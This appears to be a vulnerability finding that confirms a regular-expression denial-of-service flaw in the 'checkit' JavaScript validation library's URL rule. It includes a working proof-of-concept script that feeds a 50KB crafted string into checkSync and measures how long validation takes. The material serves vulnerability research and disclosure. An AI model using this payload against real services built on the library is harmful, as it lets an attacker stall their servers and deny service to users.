Confirmed: `checkSync` with the `url` rule triggers the ReDoS in `Checkit.Regex.url.test()` at the `runRule` sink, taking ~2.3s for a 50KB payload (scales quadratically). Here's the exploit:

```javascript
const Checkit = require("checkit");

// A ~50KB string with no valid scheme/terminator triggers catastrophic
// backtracking in Checkit.Regex.url (core.js:241, Checkit.Regex[rule].test)
const payload = "http://" + "a".repeat(50000) + "!";

const start = Date.now();
const [err] = Checkit.checkSync("website", payload, ["url"]);
console.log("validation took", Date.now() - start, "ms");
```
